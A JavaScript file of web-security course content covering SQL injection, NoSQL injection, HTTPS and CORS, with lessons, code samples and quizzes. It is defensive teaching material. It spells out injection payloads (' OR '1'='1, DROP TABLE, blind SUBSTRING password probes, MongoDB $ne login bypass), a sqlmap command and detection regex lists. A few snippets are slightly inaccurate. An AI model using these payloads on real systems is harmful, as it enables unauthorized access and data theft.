    d('ORM Safety Misconceptions', 'ORMs (Sequelize, TypeORM, Prisma) use parameterized queries by default — safe. But raw queries, $queryRaw, or .executeRawUnsafe can be vulnerable. Always use parameterized versions. Some ORM features (literal, raw WHERE) may bypass protection if used incorrectly.'),
    d('Database-Specific Protections', 'PostgreSQL: pg-promise, node-postgres support parameterized queries. MySQL: mysql2 supports ? placeholders. SQL Server: @param placeholders. All drivers support parameterized queries. Stored procedures can help IF they use parameterized internal queries. Least privilege DB user accounts limit damage.')
  ],
  'SQL injection is 100% preventable. Always use parameterized queries — there is no excuse for concatenating user input into SQL. Use an ORM for safety but know its raw query APIs. Apply least privilege to database accounts. Use a WAF for defense in depth. Test with SQLmap during security audits.',
  [
    q('What is SQL injection?', 'A code injection technique where malicious SQL is inserted into application queries through user input.'),
    q('What is the primary prevention?', 'Parameterized queries (prepared statements). Database driver treats input as data, not SQL.'),
    q('What does \' OR \'1\'=\'1 do?', 'Bypasses authentication by making the WHERE clause always true. Returns all users.'),
    q('What is blind SQL injection?', 'No error output — attacker infers data through true/false responses or time delays.'),
    q('Are ORMs safe from SQL injection?', 'ORMs are safe by default but raw queries or unsafe APIs ($queryRaw, executeRaw) can be vulnerable.'),
    q('What is second-order SQL injection?', 'Malicious data is stored in the database and later executed in a different query context.'),
    q('What is UNION-based SQL injection?', 'Using UNION to append results from other tables — exfiltrates data beyond the intended query.'),
    q('What database user permissions should be used?', 'Least privilege — only the permissions needed (SELECT, INSERT for most app users).'),
    q('Can stored procedures prevent SQL injection?', 'Only if they use parameterized queries internally. Dynamic SQL in stored procedures is still vulnerable.'),
    q('What tool is used to test for SQL injection?', 'SQLmap — automated SQL injection detection and exploitation tool.')
  ],
  R(10,35,110,25,'#0070f3','','User Input','\' OR \'1\'=\'1') +
  A(120,48,150,48) +
  R(160,35,110,25,'#dc3545','','Vulnerable Query','String concatenation') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','SQL Injection','Data breach!') +
  R(10,100,110,25,'#28a745','','Param Query','SELECT * FROM users WHERE email = $1') +
  R(10,130,110,25,'#e83e8c','','ORM','Safe by default') +
  R(10,160,110,25,'#6610f2','','Least Privilege','Limited DB user') +
  R(290,35,190,155,'#17a2b8','','SQL Injection','Injection through unsanitized input. Prevent with parameterized queries 100% of the time.') +
  T(240,220,'SQL Injection: Malicious SQL through user input. 100% preventable with parameterized queries.',9,'#666','middle'),
  [
    e('Vulnerable vs Safe Query', 'Never concatenate user input.', codeBlock([
      '// VULNERABLE — NEVER DO THIS',
      "app.get('/user', async (req, res) => {",
      '  const id = req.query.id;',
      '  const result = await db.query(',
      "    \"SELECT * FROM users WHERE id = '\" + id + \"'\",",
      '  );',
      '  // Input: 1; DROP TABLE users; --',
      '  // Executes: SELECT * FROM users WHERE id = \'1\';',
      '  //           DROP TABLE users; --\'',
      '});',
      '',
      '// SAFE — ALWAYS USE PARAMETERIZED',
      "app.get('/user', async (req, res) => {",
      '  const id = req.query.id;',
      '  const result = await db.query(',
      '    "SELECT * FROM users WHERE id = $1",',
      '    [id]  // treated as data, not SQL',
      '  );',
      '  // Input: 1; DROP TABLE users; --',
      '  // Searches for id = literal string:',
      '  // "1; DROP TABLE users; --"',
      '});'
    ]), 'Parameterized queries treat input as data, making SQL injection impossible.'),
    e('Blind SQL Injection (Boolean-Based)', 'Infer data without output.', codeBlock([
      '// Attacker sends true/false tests:',
      "?id=1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'",
      '',
      '// If page loads normally → first char is \'a\'',
      '// If page errors → not \'a\'',
      '',
      '// Automate with SQLmap:',
      '// sqlmap -u "http://site.com/user?id=1" --dbs',
      '',
      '// Prevention (same as always):',
      'db.query("SELECT * FROM users WHERE id = $1", [id]);',
      '// ORM: User.findByPk(id);'
    ]), 'Blind SQL injection infers data character-by-character through true/false responses.'),
    e('ORM Safe Usage (Prisma)', 'Avoid raw query vulnerabilities.', codeBlock([
      '// SAFE — Prisma standard queries',
      'const user = await prisma.user.findUnique({',
      '  where: { email: userInput }',
      '});',
      '',
      '// SAFE — Parameterized raw query',
      'const users = await prisma.$queryRaw(',
      '  Prisma.sql`SELECT * FROM users WHERE email = ${userInput}`',
      ');',
      '',
      '// VULNERABLE — String interpolation in raw',
      'const users = await prisma.$queryRawUnsafe(',
      "  `SELECT * FROM users WHERE email = '${userInput}'`",
      '); // SQL injection possible!',
      '',
      '// SAFE alternative to $queryRawUnsafe:',
      'const users = await prisma.$queryRawUnsafe(',
      "  'SELECT * FROM users WHERE email = $1',",
      '  userInput',
      ');'
    ]), 'ORMs are safe by default but raw query APIs can be misused — always use parameterized versions.'),
    e('Least Privilege DB User', 'Limit damage from injection.', codeBlock([
      "-- Create app user with minimal permissions",
      "CREATE USER app_user WITH PASSWORD 'secure_password';",
      '',
      "-- Grant only what the app needs",
      "GRANT SELECT, INSERT, UPDATE ON orders TO app_user;",
      "GRANT SELECT, INSERT, UPDATE ON products TO app_user;",
      "GRANT SELECT ON users TO app_user; -- read-only",
      '',
      "-- NEVER grant:",
      "-- DROP TABLE, DROP DATABASE, CREATE USER",
      "-- ALTER TABLE, TRUNCATE",
      "-- SUPERUSER privileges",
      '',
      "-- Even if SQL injection succeeds,",
      "-- attacker cannot DROP tables or CREATE users",
      '',
      "-- Separate read-only connection for reports:",
      "CREATE USER report_user WITH PASSWORD 'report_pass';",
      "GRANT SELECT ON ALL TABLES IN SCHEMA public TO report_user;"
    ]), 'Least privilege database accounts limit what an attacker can do even with SQL injection.'),
    e('SQL Injection via LIKE Operator', 'Escape special characters.', codeBlock([
      '// SAFE — parameterized query handles most cases',
      "const result = await db.query(",
      "  \"SELECT * FROM products WHERE name ILIKE '%' || $1 || '%'\",",
      '  [searchTerm]',
      ');',
      '',
      '// But LIKE wildcards (% _) are still interpreted',
      '// Search for "___" matches all 3-char names',
      '',
      '// Escape LIKE special characters:',
      'function escapeLike(input) {',
      "  return input.replace(/[%_]/g, '\\\\$&');",
      '}',
      '',
      "const safe = escapeLike(searchTerm);",
      "const result = await db.query(",
      "  \"SELECT * FROM products WHERE name ILIKE '%' || $1 || '%'\",",
      '  [safe]',
      ');'
    ]), 'Even with parameterized queries, LIKE wildcards need escaping to prevent unexpected matches.'),
    e('SQL Injection Detection (Logging)', 'Detect injection attempts.', codeBlock([
      '// Log suspicious queries for monitoring',
      'function logQuery(sql, params) {',
      '  const suspicious = [',
      "    /'\\s*OR\\s*['\"]?\\d/i,",
      "    /'\\s*AND\\s*['\"]?\\d/i,",
      '    /UNION\\s+ALL?\\s+SELECT/i,',
      '    /DROP\\s+TABLE/i,',
      "    /--\\s*$/m,",
      "    /\\bSLEEP\\b/i,",
      "    /\\bWAITFOR\\b/i",
      '  ];',
      '',
      '  const isThreat = suspicious.some(',
      '    r => r.test(sql) || params?.some(',
      '      p => typeof p === \'string\' && r.test(p)',
      '    )',
      '  );',
      '',
      '  if (isThreat) {',
      '    console.warn(\'SQL injection attempt detected:\', {',
      '      sql, params, ip: req.ip',
      '    });',
      '  }',
      '}'
    ]), 'Log suspicious query patterns to detect and respond to SQL injection attempts.')
  ],
  [
    m('What is the primary SQL injection prevention?', ['Input validation', 'Parameterized queries', 'Encryption', 'Firewall'], 1, 'Parameterized queries are the definitive prevention — database treats input as data, not SQL.'),
    m('What does \' OR \'1\'=\'1 do?', ['Deletes a table', 'Makes condition always true', 'Inserts a row', 'Updates a column'], 1, 'It makes the WHERE clause always true, potentially returning all rows or bypassing authentication.'),
    m('What is blind SQL injection?', ['Injection that returns no data directly', 'Injection with visible errors', 'Only for NoSQL', 'Authentication bypass only'], 0, 'Blind SQL injection infers data through true/false or time-based responses.'),
    m('Can ORMs be vulnerable to SQL injection?', ['No, never', 'Yes, with raw queries', 'Only in MySQL', 'Only SELECT queries'], 1, 'ORMs are safe by default but raw query APIs can introduce vulnerabilities.'),
    m('What is the best database user permission model?', ['Superuser', 'Least privilege', 'Read-write all', 'No permissions'], 1, 'Least privilege limits damage — app user gets only needed permissions.'),
    m('What tool automates SQL injection testing?', ['nmap', 'SQLmap', 'Wireshark', 'Burp Suite'], 1, 'SQLmap is the standard automated SQL injection detection and exploitation tool.')
  ]
);

/* =================== TOPIC 15: NoSQL Injection =================== */
addTopic('auth-nosql-injection', 'NoSQL Injection', 'intermediate', 20,
  ['NoSQL injection is a security vulnerability where attackers inject malicious queries into NoSQL databases (MongoDB, Redis, Couchbase).',
   'Unlike SQL injection, NoSQL injection exploits the query language syntax and operator injection rather than string concatenation.',
   'MongoDB is most commonly targeted: attackers inject $ne (not equal), $gt (greater than), $regex operators through JSON input.',
   'Prevention: input validation with type checking, use ORM/ODM methods, sanitize operator characters, avoid passing raw query objects.'
  ],
  'NoSQL injection is like a trickster at a library who asks the librarian "Find me books where the author is NOT the author you\'re thinking of" ($ne). The librarian\'s system interprets the logical operator, returning books the trickster shouldn\'t see.',
  [
    d('MongoDB Operator Injection', 'REST APIs parse JSON body into MongoDB query objects. If attacker sends {"$ne": ""} instead of a string, MongoDB interprets $ne as "not equal" operator. Login bypass: {"password": {"$ne": ""}} matches any password that is not empty.'),
    d('Common MongoDB Injection Operators', '$ne (not equal) — bypass equality checks. $gt/$gte (greater than) — bypass range checks. $regex — pattern matching, can extract data character by character. $where — executes JavaScript (dangerous). $in — matches any in array. $exists — checks field existence.'),
    d('NoSQL Injection via JSON Body', 'Vulnerable: const user = await User.findOne({ email: req.body.email, password: req.body.password }). Input: {"email": "admin@test.com", "password": {"$ne": ""}}. Query becomes: find user where email=admin and password != "". Always validate that values are strings, not objects.'),
    d('NoSQL Injection in Express + Mongoose', 'Mongoose\'s find() methods accept raw query objects from req.body. If you pass req.body directly to find(), attackers can inject operators. Solution: validate input types (typeof === \'string\'), use schema validation, or convert inputs explicitly.'),
    d('Prevention Best Practices', '1. Validate that input values are strings, not objects. 2. Use Mongoose schema validation (type casting). 3. Sanitize input: strip $ and . characters from keys. 4. Use mongo-sanitize library. 5. Avoid passing req.body directly to queries. 6. Use parameter-style queries when possible.')
  ],
  'NoSQL injection is less known but equally dangerous. The key defense: validate that all query values are the expected primitive types (string, number), not objects. Strip MongoDB operators ($, .) from input keys. Use Mongoose schemas for type coercion. Never pass user input directly as query objects.',
  [
    q('What is NoSQL injection?', 'Injecting malicious query operators into NoSQL database queries through unsanitized user input.'),
    q('Why is NoSQL injection different from SQL injection?', 'NoSQL exploits query operators ($ne, $gt, $regex) rather than SQL syntax. Input is often JSON objects, not strings.'),
    q('What is the $ne operator?', 'Not equal — can bypass authentication: {"password": {"$ne": ""}} matches any non-empty password.'),
    q('What is the $regex operator?', 'Pattern matching — can extract data character by character (like blind SQL injection).'),
    q('How does NoSQL injection happen in Express?', 'Express parses JSON body. If passed directly to MongoDB query, attackers can inject operators as nested objects.'),
    q('What is the primary prevention?', 'Validate that input values are the expected primitive types (strings, numbers), not objects with operators.'),
    q('What is mongo-sanitize?', 'An npm package that strips $ and . from MongoDB query keys to prevent operator injection.'),
    q('Can Mongoose prevent NoSQL injection?', 'Partially — Mongoose schema type casting helps but does not prevent all injection if raw objects are passed.'),
    q('What is the $where operator?', 'Executes JavaScript in MongoDB queries — extremely dangerous if user input reaches it.'),
    q('What characters should be stripped from user input?', '$ (dollar sign) and . (dot) — MongoDB uses these for operators and nested field access.')
  ],
  R(10,35,110,25,'#0070f3','','User Input','{"$ne": ""}') +
  A(120,48,150,48) +
  R(160,35,110,25,'#dc3545','','MongoDB Query','password: {$ne: ""}') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','Auth Bypass','Match all users') +
  R(10,100,110,25,'#28a745','','$regex','Blind extraction') +
  R(10,130,110,25,'#e83e8c','','$where','JS execution') +
  R(10,160,110,25,'#6610f2','','Sanitize','Strip $ and .') +
  R(290,35,190,155,'#17a2b8','','NoSQL Injection','Operator injection in MongoDB. Prevent by validating input types and sanitizing operators.') +
  T(240,220,'NoSQL Injection: MongoDB operator injection via JSON input. Validate types, sanitize $ and .',9,'#666','middle'),
  [
    e('Vulnerable MongoDB Query', 'Direct object injection.', codeBlock([
      '// VULNERABLE — attacker controls query object',
      "app.post('/login', async (req, res) => {",
      '  const { email, password } = req.body;',
      '',
      '  // If attacker sends:',
      '  // {"email": "admin@test.com",',
      '  //  "password": {"$ne": ""}}',
      '  // Query becomes:',
      '  // User.findOne({',
      '  //   email: "admin@test.com",',
      '  //   password: {$ne: ""}',
      '  // })',
      '  // → returns admin user!',
      '',
      '  const user = await User.findOne({',
      '    email,',
      '    password, // attacker\'s object bypasses check',
      '  });',
      '});'
    ]), 'Passing req.body directly allows operator injection — MongoDB interprets $ne, $gt, etc.'),
    e('Safe MongoDB Query (Type Validation)', 'Validate input types.', codeBlock([
      "app.post('/login', async (req, res) => {",
      '  const { email, password } = req.body;',
      '',
      '  // Validate that values are strings',
      '  if (typeof email !== \'string\' ||',
      '      typeof password !== \'string\') {',
      '    return res.status(400).json({',
      '      error: \'Invalid input types\'',
      '    });',
      '  }',
      '',
      '  // Now injection is impossible',
      '  // password value is always a string',
      '  // {$ne: ""} would be a string, not an object',
      '  const user = await User.findOne({ email, password });',
      '});'
    ]), 'Type validation prevents object injection — ensure all values are expected primitive types.'),
    e('Sanitize Input with mongo-sanitize', 'Strip MongoDB operators.', codeBlock([
      'const sanitize = require(\'mongo-sanitize\');',
      '',
      "app.post('/login', async (req, res) => {",
      '  // Strips $ and . from keys/values',
      '  const clean = sanitize(req.body);',
      '  // Input:  {email: "a@b.com", password: {"$ne": ""}}',
      '  // Output: {email: "a@b.com", password: {ne: ""}}',
      '  //        $ removed from $ne — no longer an operator',
      '',
      '  const user = await User.findOne({',
      '    email: clean.email,',
      '    password: clean.password,',
      '  });',
      '  // password: {ne: ""} won\'t match anything',
      '});',
      '',
      '// Also works on arrays and nested objects',
      'const clean = sanitize({',
      '  $gt: "",', // becomes {gt: ""}
      '  $regex: ".*",', // becomes {regex: ".*"}
      '  "a.b": "c"', // "a b": "c" (dot removed)
      '});'
    ]), 'mongo-sanitize strips MongoDB operators ($, .) from user input to prevent injection.'),
    e('Mongoose Schema Protection', 'Type casting defense.', codeBlock([
      'const mongoose = require(\'mongoose\');',
      '',
      'const UserSchema = new mongoose.Schema({',
      "  email: { type: String, required: true },",
      "  password: { type: String, required: true },",
      "  role: { type: String, enum: ['user', 'admin'] }",
      '});',
      '',
      '// Mongoose casts values to schema types',
      '// Input: {email: "admin@test.com", password: {$ne: ""}}',
      '',
      '// password: {$ne: ""} → Mongoose sees "String" type',
      '// It may cast the object to string "[object Object]"',
      '// or throw a CastError depending on strict mode',
      '',
      '// However, find() with raw filter object:',
      'User.find({ email: req.body.email })',
      '// If req.body.email = {$gt: ""} — Mongoose skips',
      '// type casting for query values sometimes!',
      '',
      '// SAFER: validate explicitly',
      'const email = String(req.body.email); // force string'
    ]), 'Mongoose schemas provide partial protection but explicit validation is still needed.'),
    e('Regex Injection via $regex', 'Blind data extraction.', codeBlock([
      '// Attacker uses $regex to extract data char by char',
      '// API: /api/users?search=admin',
      '',
      '// VULNERABLE:',
      "app.get('/api/users', async (req, res) => {",
      '  const users = await User.find({',
      '    email: {',
      "      $regex: req.query.search", // attacker controls regex
      '    }',
      '  });',
      '  res.json(users);',
      '});',
      '',
      '// Attacker sends:',
      "// GET /api/users?search=^a.*@admin.com$",
      '// → finds emails starting with "a"',
      '',
      '// SAFE: restrict to simple string matching',
      "app.get('/api/users', async (req, res) => {",
      '  const search = String(req.query.search || \'\');',
      '  const users = await User.find({',
      '    email: {',
      '      $regex: escapeRegex(search),',
      '      $options: \'i\'',
      '    }',
      '  });',
      '  res.json(users);',
      '});',
      '',
      'function escapeRegex(str) {',
      "  return str.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');",
      '}'
    ]), '$regex injection can extract data like blind SQL injection. Escape regex special characters.'),
    e('Block Suspicious Operators (Middleware)', 'Reject dangerous query patterns.', codeBlock([
      '// Middleware to block NoSQL injection attempts',
      "app.use((req, res, next) => {",
      '  const body = JSON.stringify(req.body);',
      '  const dangerous = [',
      '    /\\$ne/i, /\\$gt/i, /\\$regex/i,',
      '    /\\$where/i, /\\$in/i, /\\$exists/i',
      '  ];',
      '',
      '  for (const pattern of dangerous) {',
      '    if (pattern.test(body)) {',
      '      return res.status(400).json({',
      '        error: \'Suspicious input detected\'',
      '      });',
      '    }',
      '  }',
      '',
      '  next();',
      '});',
      '',
      '// Or use a library like express-mongo-sanitize',
      'const mongoSanitize = require(\'express-mongo-sanitize\');',
      "app.use(mongoSanitize());",
      '// Automatically strips $ and . from all inputs'
    ]), 'Middleware to detect and block NoSQL injection operators before they reach the database.')
  ],
  [
    m('What is the most common NoSQL injection target?', ['Redis', 'MongoDB', 'Cassandra', 'DynamoDB'], 1, 'MongoDB is the most common target due to its JSON query syntax and operator-rich API.'),
    m('What does the $ne operator do?', ['Not equal', 'Less than', 'Regex match', 'Exists'], 0, '$ne means "not equal" — can bypass equality checks in authentication.'),
    m('What is the primary NoSQL injection prevention?', ['Parameterized queries', 'Input type validation', 'Output encoding', 'CSP'], 1, 'Validate that query values are expected primitive types (strings), not operator objects.'),
    m('What characters are stripped by mongo-sanitize?', ['< >', '$ .', '/ \\', '& |'], 1, '$ (dollar) and . (dot) are stripped to prevent MongoDB operator injection.'),
    m('What does Mongoose\'s schema type casting do?', ['Prevents all injection', 'Casts values to defined types', 'Encrypts data', 'Validates passwords'], 1, 'Mongoose attempts to cast values to schema-defined types, providing partial protection.'),
    m('What is $regex injection used for?', ['Performance optimization', 'Blind data extraction', 'Index creation', 'Data validation'], 1, '$regex can extract data character by character, similar to blind SQL injection.')
  ]
);

/* =================== TOPIC 16: HTTPS =================== */
addTopic('auth-https', 'HTTPS (HTTP over TLS)', 'beginner', 20,
  ['HTTPS is HTTP over TLS (Transport Layer Security) — encrypting all communication between client and server.',
   'TLS ensures: confidentiality (encrypted — no eavesdropping), integrity (no tampering), authentication (server identity verified via certificates).',
   'Without HTTPS: passwords, tokens, cookies, and data are sent in plaintext — anyone on the network can read them.',
   'Implementation: TLS certificate (from CA), HTTPS server configuration, HSTS header to enforce HTTPS, automatic HTTP→HTTPS redirect.'
  ],
  'HTTPS is like a private conversation in a soundproof room. HTTP is like shouting across a crowded room — anyone can hear your credit card number, password, or private messages. TLS encrypts everything so only the two participants understand the conversation.',
  [
    d('TLS Handshake', '1. Client connects to server. 2. Server presents TLS certificate (public key). 3. Client verifies certificate against trusted CA. 4. Client generates session key, encrypts with server\'s public key. 5. Server decrypts with private key. 6. Both use session key for symmetric encryption. Completes in ~1-2 round trips.'),
    d('TLS Certificates', 'Issued by Certificate Authorities (CA): Let\'s Encrypt (free), DigiCert, GlobalSign. Certificate contains: domain name, issuer, public key, validity period, subject. Chain of trust: root CA → intermediate CA → your certificate. Wildcard certificates: *.example.com covers all subdomains.'),
    d('HTTPS Configuration Best Practices', 'Use TLS 1.3 (fastest, most secure). Disable TLS 1.0/1.1 (deprecated). Use strong cipher suites (ECDHE + AES-GCM). Set HSTS header to enforce HTTPS. Redirect HTTP to HTTPS with 301. Use modern tools: Certbot (Let\'s Encrypt), Caddy (auto-HTTPS).'),
    d('HSTS (HTTP Strict Transport Security)', 'Tells browsers to always use HTTPS for your domain. max-age: duration (1 year recommended). includeSubDomains: apply to all subdomains. preload: submit to browser HSTS preload list. Once set, browser will never use HTTP — even if user types http://.'),
    d('Common HTTPS Pitfalls', 'Mixed content: loading HTTP resources on HTTPS pages (browser blocks). Self-signed certificates: not trusted by browsers (use in dev only). Expired certificates: browser shows warning. Weak cipher suites: some still allow downgrade attacks. Missing intermediate certificate: chain incomplete.')
  ],
  'HTTPS is non-negotiable for any production web application. Use Let\'s Encrypt for free certificates. Set HSTS with a long max-age. Redirect all HTTP traffic. Use TLS 1.3. Never mix HTTP and HTTPS content. Test with SSL Labs (ssllabs.com) for configuration rating.',
  [
    q('What is HTTPS?', 'HTTP over TLS — encrypting communication between client and server for confidentiality, integrity, and authentication.'),
    q('What does TLS provide?', 'Confidentiality (encryption), Integrity (no tampering), Authentication (server identity via certificates).'),
    q('What is a TLS handshake?', 'The process where client and server negotiate encryption: certificate exchange, key agreement, session key establishment.'),
    q('What is a Certificate Authority?', 'A trusted third party that issues TLS certificates, vouching for the server\'s identity.'),
    q('What is Let\'s Encrypt?', 'A free, automated CA that provides TLS certificates. Uses ACME protocol for automated issuance and renewal.'),
    q('What is HSTS?', 'HTTP Strict Transport Security — a header that tells browsers to always use HTTPS for the domain.'),
    q('What is mixed content?', 'Loading HTTP resources (images, scripts) on an HTTPS page. Browsers block most mixed content.'),
    q('What is the current TLS version?', 'TLS 1.3 — fastest and most secure. TLS 1.2 is still widely used. TLS 1.0/1.1 are deprecated.'),
    q('What is a wildcard certificate?', 'A certificate covering a domain and all its subdomains: *.example.com covers www.example.com, api.example.com, etc.'),
    q('What tool evaluates HTTPS configuration?', 'SSL Labs (ssllabs.com/ssltest) — provides a grade (A+ is best) and detailed analysis.')
  ],
  R(10,35,110,25,'#0070f3','','HTTP','Plaintext') +
  A(120,48,150,48) +
  R(160,35,110,25,'#dc3545','','Man-in-Middle','Eavesdrop + tamper') +
  A(120,78,150,78) +
  R(10,65,110,25,'#28a745','','TLS','Encrypted tunnel') +
  A(120,48,150,48) +
  R(160,65,110,25,'#ffc107','','Certificate','Verify identity') +
  R(10,95,110,25,'#e83e8c','','HSTS','Force HTTPS') +
  R(10,125,110,25,'#6610f2','','TLS 1.3','Fast + secure') +
  R(10,155,110,25,'#17a2b8','','Redirect','HTTP → HTTPS 301') +
  R(290,35,190,155,'#17a2b8','','HTTPS / TLS','Encrypted HTTP: TLS handshake, certificates, HSTS, secure configuration. Always use HTTPS.') +
  T(240,220,'HTTPS: Encrypt all traffic with TLS. Non-negotiable for production. Use Let\'s Encrypt + HSTS.',9,'#666','middle'),
  [
    e('HTTPS Server (Node.js)', 'Create HTTPS server with TLS.', codeBlock([
      'const https = require(\'https\');',
      'const fs = require(\'fs\');',
      'const express = require(\'express\');',
      '',
      'const app = express();',
      '',
      'const options = {',
      '  key: fs.readFileSync(\'privkey.pem\'),',
      '  cert: fs.readFileSync(\'fullchain.pem\'),',
      '  // Let\'s Encrypt: /etc/letsencrypt/live/domain/',
      '};',
      '',
      'https.createServer(options, app).listen(443, () => {',
      '  console.log(\'HTTPS server on port 443\');',
      '});',
      '',
      '// HTTP → HTTPS redirect',
      "app.use((req, res, next) => {",
      '  if (!req.secure) {',
      '    return res.redirect(301,',
      '      `https://${req.headers.host}${req.url}`',
      '    );',
      '  }',
      '  next();',
      '});'
    ]), 'HTTPS server setup with TLS certificate and HTTP-to-HTTPS redirect.'),
    e('HSTS Header Configuration', 'Enforce HTTPS via browser.', codeBlock([
      "// HSTS header (Express)",
      "app.use((req, res, next) => {",
      "  res.setHeader('Strict-Transport-Security',",
      "    'max-age=31536000; includeSubDomains; preload'",
      '  );',
      '  next();',
      '});',
      '',
      '// max-age=31536000 = 1 year',
      '// includeSubDomains = apply to all subdomains',
      '// preload = submitted to browser preload list',
      '',
      '// WARNING: once set, cannot revert for max-age',
      '// Start with a short max-age during testing:',
      "// 'max-age=86400' (24 hours)",
      '',
      '// Or use helmet for security headers:',
      'const helmet = require(\'helmet\');',
      "app.use(helmet.hsts({",
      '  maxAge: 31536000,',
      '  includeSubDomains: true,',
      '  preload: true',
      '}));'
    ]), 'HSTS forces browsers to always use HTTPS. Start with short max-age, increase after verification.'),
    e('Let\'s Encrypt with Certbot', 'Free TLS certificates.', codeBlock([
      '# Install Certbot and obtain certificate',
      '# sudo apt install certbot python3-certbot-nginx',
      '',
      '# Get certificate (standalone mode)',
      '# sudo certbot certonly --standalone',
      '#   -d example.com -d www.example.com',
      '',
      '# Certificate location:',
      '# /etc/letsencrypt/live/example.com/',
      '# ├── cert.pem      (server certificate)',
      '# ├── chain.pem     (intermediate CA)',
      '# ├── fullchain.pem (cert + chain)',
      '# └── privkey.pem   (private key, keep secret!)',
      '',
      '# Auto-renewal (cron job)',
      '# 0 3 * * * certbot renew --quiet',
      '',
      '# Or use node-greenlock for Node.js',
      '# npm install greenlock-express'
    ]), 'Let\'s Encrypt provides free automated certificates via Certbot.'),
    e('TLS 1.3 Only Configuration', 'Strongest TLS settings.', codeBlock([
      'const https = require(\'https\');',
      '',
      'const options = {',
      '  key: fs.readFileSync(\'privkey.pem\'),',
      '  cert: fs.readFileSync(\'fullchain.pem\'),',
      '',
      '  // TLS 1.3 only (Node.js 12+)',
      '  secureOptions: crypto.constants.SSL_OP_NO_TLSv1',
      '    | crypto.constants.SSL_OP_NO_TLSv1_1',
      '    | crypto.constants.SSL_OP_NO_TLSv1_2,',
      '',
      '  // Strong cipher suites (TLS 1.3 default)',
      '  ciphers: [',
      '    \'TLS_AES_256_GCM_SHA384\',',
      '    \'TLS_CHACHA20_POLY1305_SHA256\',',
      '    \'TLS_AES_128_GCM_SHA256\'',
      '  ].join(\':\'),',
      '};',
      '',
      'https.createServer(options, app);'
    ]), 'TLS 1.3 configuration with strong cipher suites for maximum security.'),
    e('Test HTTPS Configuration', 'Verify TLS setup.', codeBlock([
      '# Using OpenSSL to test TLS connection',
      '# openssl s_client -connect example.com:443 -tls1_3',
      '',
      '# Check certificate chain',
      '# openssl s_client -connect example.com:443 -showcerts',
      '',
      '# Scan with SSL Labs (API)',
      '# curl https://api.ssllabs.com/api/v3/analyze?d=example.com',
      '',
      '# Using nmap script',
      '# nmap --script ssl-enum-ciphers -p 443 example.com',
      '',
      '# Node.js test',
      'const https = require(\'https\');',
      'https.get("https://example.com", (res) => {',
      '  console.log("TLS version:", res.socket.getProtocol());',
      '  // Should output: TLSv1.3',
      '});'
    ]), 'Test HTTPS configuration with OpenSSL, SSL Labs, and Node.js to ensure proper TLS setup.')
  ],
  [
    m('What does HTTPS provide?', ['Speed', 'Encryption + integrity + authentication', 'SEO improvement', 'Caching'], 1, 'HTTPS (HTTP over TLS) provides confidentiality, integrity, and server authentication.'),
    m('What protocol does HTTPS use for encryption?', ['SSL', 'TLS', 'SSH', 'IPsec'], 1, 'HTTPS uses TLS (Transport Layer Security). SSL is the deprecated predecessor.'),
    m('What is Let\'s Encrypt?', ['A paid CA', 'A free automated CA', 'A TLS library', 'A cipher suite'], 1, 'Let\'s Encrypt provides free, automated TLS certificates.'),
    m('What does HSTS do?', ['Encrypts traffic', 'Forces browsers to use HTTPS', 'Optimizes performance', 'Validates certificates'], 1, 'HSTS tells browsers to always use HTTPS for the domain, preventing HTTP downgrade.'),
    m('What is mixed content?', ['Multiple TLS versions', 'HTTP resources on HTTPS page', 'Mixed HTTP methods', 'Mixed origins'], 1, 'Mixed content occurs when an HTTPS page loads HTTP resources — browsers block most of it.'),
    m('What is the most secure TLS version?', ['TLS 1.1', 'TLS 1.2', 'TLS 1.3', 'SSL 3.0'], 2, 'TLS 1.3 is the most secure and fastest version. TLS 1.2 is acceptable but deprecated versions should be disabled.')
  ]
);

/* =================== TOPIC 17: CORS =================== */
addTopic('auth-cors', 'CORS (Cross-Origin Resource Sharing)', 'intermediate', 20,
  ['CORS is a browser security mechanism that controls which origins can access resources on your server.',
   'Same-Origin Policy (SOP): browsers block JavaScript from making requests to a different origin (protocol + domain + port) than the page\'s origin.',
   'CORS relaxes SOP by allowing servers to specify which origins are permitted via HTTP headers (Access-Control-Allow-Origin).',
   'CORS is enforced by the browser — it does NOT protect the server from malicious requests. Non-browser clients (curl, server-to-server) are unaffected.'
  ],
  'CORS is like your apartment building\'s visitor policy. The doorman (browser) checks every visitor. By default, only residents (same origin) can enter. CORS is the "approved visitors list" — you tell the doorman "my friend from building B (other origin) is allowed to visit my apartment."',
  [
    d('Same-Origin Policy', 'Origin = protocol (https) + domain (api.example.com) + port (443). Two URLs with different origins cannot read each other\'s resources. SOP prevents evil.com from reading your bank.com data. Important: SOP blocks reading (response), not writing (request). POST requests still go through.'),
    d('CORS Headers', 'Access-Control-Allow-Origin: which origins are allowed (* or specific). Access-Control-Allow-Methods: allowed HTTP methods. Access-Control-Allow-Headers: allowed request headers. Access-Control-Allow-Credentials: whether cookies/auth allowed. Access-Control-Max-Age: cache preflight duration. Access-Control-Expose-Headers: headers exposed to JS.'),
    d('Simple vs Preflight Requests', 'Simple: GET, HEAD, POST with standard content types (text/plain, application/x-www-form-urlencoded, multipart/form-data). No custom headers. Preflight: anything else. Browser sends OPTIONS preflight request before the actual request. Server must respond with allowed methods/headers.'),
    d('CORS with Credentials', 'Cross-origin requests that include cookies or HTTP authentication require: Access-Control-Allow-Credentials: true. Access-Control-Allow-Origin must be a specific origin (NOT *). Client must set credentials: \'include\' (fetch) or withCredentials: true (XHR).'),
    d('CORS Security Considerations', 'CORS is client-side only — does not prevent server-to-server attacks. Avoid Access-Control-Allow-Origin: * if credentials are involved. Use specific origin lists in production. Validate Origin header server-side. CORS misconfiguration is a common security issue: too permissive origins expose APIs.')
  ],
  'CORS is about controlled access. Be as specific as possible with allowed origins. Use credentials mode carefully — requires specific origin (not *). Understand preflight to avoid performance issues. Remember: CORS protects clients, not servers. Use authentication/authorization for server-side protection.',
  [
    q('What is CORS?', 'Cross-Origin Resource Sharing — a browser mechanism controlling cross-origin resource access via HTTP headers.'),
    q('What is Same-Origin Policy?', 'A browser security feature that blocks JavaScript from making requests to a different origin than the page.'),
    q('What defines an origin?', 'Protocol (https) + Domain (example.com) + Port (443). All three must match for same origin.'),
    q('What is a preflight request?', 'An OPTIONS request sent by the browser before complex cross-origin requests to check if the server permits them.'),
    q('What is the difference between simple and preflight requests?', 'Simple: GET/POST with standard content-type, no custom headers. Preflight: everything else (requires OPTIONS check).'),
